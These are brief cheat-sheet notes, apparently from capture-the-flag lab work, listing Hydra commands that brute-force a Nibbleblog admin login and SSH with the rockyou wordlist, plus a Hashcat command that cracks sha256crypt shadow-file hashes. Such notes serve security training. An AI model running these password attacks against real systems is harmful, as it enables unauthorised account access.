
**HYDRA**

http-post-form:

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.26.24 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect username or password"`

ssh:

`hydra -l sunny -P ~/SecLists/rockyou.txt -s <port> ssh://$ip`

**HASHCAT**

shadow file hash - sha256crypt (7400)

`hashcat -m 7400 -a 0 hash ~/SecLists/rockyou.txt`   



